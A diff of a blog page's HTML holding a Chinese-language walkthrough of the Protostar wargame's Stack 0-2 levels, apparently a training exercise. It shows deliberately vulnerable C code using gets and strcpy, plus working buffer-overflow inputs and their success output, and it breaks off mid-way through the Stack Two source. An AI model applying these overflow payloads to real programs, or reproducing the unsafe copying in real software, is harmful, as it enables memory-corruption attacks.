@@ -1,38 +1,38 @@
 <!DOCTYPE html>
-<html lang="en-us">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Stack Four ~ Six ☞ kokodayo
 Stack Zero  This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
 This level is at /opt/protostar/bin/stack0
- #include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) {  volatile int modified;  char buffer[64];   modified = 0;  gets(buffer);   if(modified !'><title>[hidden] Protostar Stack 0-3 Walkthrough</title>
+ #include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&amp;#34;you have changed the &amp;#39;modified&amp;#39; variable\n&amp;#34;); } else { printf(&amp;#34;Try again?'><title>[hidden] Protostar Stack 0-3 Walkthrough</title>
 
 <link rel='canonical' href='/p/protostar_stack_0-3/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='[hidden] Protostar Stack 0-3 Walkthrough'>
+<link rel="stylesheet" href="/scss/style.min.96c4f3663a37780b0e6e8b4cc35af21d2606359e8efcfebfcc4dbf7e953317a8.css"><meta property='og:title' content='[hidden] Protostar Stack 0-3 Walkthrough'>
 <meta property='og:description' content='Stack Four ~ Six ☞ kokodayo
 Stack Zero  This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
 This level is at /opt/protostar/bin/stack0
- #include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) {  volatile int modified;  char buffer[64];   modified = 0;  gets(buffer);   if(modified !'>
+ #include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&amp;#34;you have changed the &amp;#39;modified&amp;#39; variable\n&amp;#34;); } else { printf(&amp;#34;Try again?'>
 <meta property='og:url' content='/p/protostar_stack_0-3/'>
-<meta property='og:site_name' content='Senri&#39;s Memo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-03-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-22T00:00:00&#43;00:00'/><meta property='og:image' content='/' />
-<meta name="twitter:site" content="@KurusuSenri">
-    <meta name="twitter:creator" content="@KurusuSenri"><meta name="twitter:title" content="[hidden] Protostar Stack 0-3 Walkthrough">
+<meta property='og:site_name' content='Untittled Deserted Site'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-03-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-22T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="[hidden] Protostar Stack 0-3 Walkthrough">
 <meta name="twitter:description" content="Stack Four ~ Six ☞ kokodayo
 Stack Zero  This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
 This level is at /opt/protostar/bin/stack0
- #include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) {  volatile int modified;  char buffer[64];   modified = 0;  gets(buffer);   if(modified !"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='/' />
+ #include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&amp;#34;you have changed the &amp;#39;modified&amp;#39; variable\n&amp;#34;); } else { printf(&amp;#34;Try again?">
     <link rel="shortcut icon" href="favicon.ico" />
 
     </head>
     <body class="
-    article-page has-toc
-">
+    article-page
+    ">
     <script>
         (function() {
             const colorSchemeKey = 'StackColorScheme';
-            localStorage.setItem(colorSchemeKey, "light");
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
         })();
     </script><script>
     (function() {
@@ -49,25 +49,183 @@ This level is at /opt/protostar/bin/stack0
         }
     })();
 </script>
-<div class="container main-container flex 
-    
-        extended
-    
-">
-    
-        <div id="article-toolbar">
-            <a href="/" class="back-home">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/senri_hu3d5cd76f3de7d1b2e16bf0ae6b13ddc2_394892_300x0_resize_q75_box.jpeg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Kurusu Senri</a></h1>
+            <h2 class="site-description">In the midst of winter, I found there was, within me, an invincible summer.</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'   style="padding: 8px;">
+                
+                
+                    
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="15 6 9 12 15 18" />
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
 </svg>
 
 
 
-                <span>返回</span>
+                
+                <span>主页</span>
             </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/'   style="padding: 8px;">
+                
+                
+                    
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/guestbook/'   style="padding: 8px;">
+                
+                
+                    
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M21 14l-3 -3h-7a1 1 0 0 1 -1 -1v-6a1 1 0 0 1 1 -1h9a1 1 0 0 1 1 1v10" />
+  <path d="M14 15v2a1 1 0 0 1 -1 1h-7l-3 3v-10a1 1 0 0 1 1 -1h2" />
+</svg>
+
+
+
+                
+                <span>留言</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/'   style="padding: 8px;">
+                
+                
+                    
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/p/about'   style="padding: 8px;">
+                
+                
+                    
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/'   style="padding: 8px;">
+                
+                
+                    
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
         </div>
-    
+    </ol>
+</aside>
 <main class="main full-width">
     <article class="main-article">
     <header class="article-header">
@@ -76,18 +234,24 @@ This level is at /opt/protostar/bin/stack0
     
     <header class="article-category">
         
-            <a href="/categories/binary/" >
+            <a href="/categories/binary/" style="background-color: #8ea885; color: #fff;">
                 Binary
+            </a>
+        
+            <a href="/categories/stack/" style="background-color: #6b69d6; color: #fff;">
+                Stack
             </a>
         
     </header>
     
 
-    <h2 class="article-title">
-        <a href="/p/protostar_stack_0-3/">[hidden] Protostar Stack 0-3 Walkthrough</a>
-    </h2>
-
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/protostar_stack_0-3/">[hidden] Protostar Stack 0-3 Walkthrough</a>
+        </h2>
     
+        
+    </div>
 
     
     <footer class="article-time">
@@ -109,10 +273,14 @@ This level is at /opt/protostar/bin/stack0
         
     </footer>
     
+
+    
 </div>
 </header>
 
     <section class="article-content">
+    
+    
     <h2 id="stack-four--six">Stack Four ~ Six</h2>
 <p><a class="link" href="protostar_stack_4-7" >☞ kokodayo</a></p>
 <h2 id="stack-zero">Stack Zero</h2>
@@ -120,40 +288,40 @@ This level is at /opt/protostar/bin/stack0
 <p>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.</p>
 <p>This level is at /opt/protostar/bin/stack0</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> modified;
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  modified <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>  gets(buffer);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(modified <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;you have changed the &#39;modified&#39; variable</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;Try again?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><hr />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Try again?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
 <p>重点是这三句话</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
-</span></span><span style="display:flex;"><span>  modified <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>  gets(buffer);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
 </span></span></code></pre></div><p>总结来说直接输入 65 个字符就可以了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ echo <span style="color:#e6db74">&#34;print \&#34;A\&#34; * 65&#34;</span>
-</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;A&#34;</span> * <span style="color:#ae81ff">65</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ echo <span style="color:#e6db74">&#34;print \&#34;A\&#34; * 65&#34;</span> &gt; stack0.py
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ python stack0.py | /opt/protostar/bin/stack0 
-</span></span><span style="display:flex;"><span>you have changed the <span style="color:#e6db74">&#39;modified&#39;</span> variable
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$
-</span></span></code></pre></div><hr />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp$ <span class="nb">echo</span> <span class="s2">&#34;print \&#34;A\&#34; * 65&#34;</span>
+</span></span><span class="line"><span class="cl">print <span class="s2">&#34;A&#34;</span> * <span class="m">65</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ <span class="nb">echo</span> <span class="s2">&#34;print \&#34;A\&#34; * 65&#34;</span> &gt; stack0.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ python stack0.py <span class="p">|</span> /opt/protostar/bin/stack0 
+</span></span><span class="line"><span class="cl">you have changed the <span class="s1">&#39;modified&#39;</span> variable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$
+</span></span></code></pre></div><hr>
 <h2 id="stack-one">Stack One</h2>
 <blockquote>
 <p>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.</p>
@@ -164,96 +332,96 @@ This level is at /opt/protostar/bin/stack0
 <li>Protostar is little endian</li>
 </ul>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> modified;
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>      errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;please specify an argument</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  modified <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>  strcpy(buffer, argv[<span style="color:#ae81ff">1</span>]);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(modified <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x61626364</span>) {
-</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;you have correctly got the variable to the right value</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;Try again, you got 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, modified);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><hr />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;please specify an argument</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
 <p>这里需要使  <code>modified == 0x61626364</code></p>
 <p>需要注意小端序</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ more stack1.py 
-</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> * <span style="color:#ae81ff">64</span>
-</span></span><span style="display:flex;"><span>modified <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\x64\x63\x62\x61&#34;</span>
-</span></span><span style="display:flex;"><span>print <span style="color:#f92672">(</span>padding + modified<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ python stack1.py &gt; st1
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ /opt/protostar/bin/stack1 <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>&lt; st1<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>you have correctly got the variable to the right value
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$
-</span></span></code></pre></div><hr />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp$ more stack1.py 
+</span></span><span class="line"><span class="cl"><span class="nv">padding</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> * <span class="m">64</span>
+</span></span><span class="line"><span class="cl"><span class="nv">modified</span> <span class="o">=</span> <span class="s2">&#34;\x64\x63\x62\x61&#34;</span>
+</span></span><span class="line"><span class="cl">print <span class="o">(</span>padding + modified<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ python stack1.py &gt; st1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ /opt/protostar/bin/stack1 <span class="s2">&#34;</span><span class="k">$(</span>&lt; st1<span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">you have correctly got the variable to the right value
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$
+</span></span></code></pre></div><hr>
 <h2 id="stack-two">Stack Two</h2>
 <blockquote>
 <p>Stack2 looks at environment variables, and how they can be set.</p>
 <p>This level is at /opt/protostar/bin/stack2</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> modified;
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>variable;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  variable <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;GREENIE&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(variable <span style="color:#f92672">==</span> NULL) {
-</span></span><span style="display:flex;"><span>      errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;please set the GREENIE environment variable</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  modified <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  strcpy(buffer, variable);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(modified <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0d0a0d0a</span>) {
-</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;you have correctly modified the variable</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;Try again, you got 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, modified);
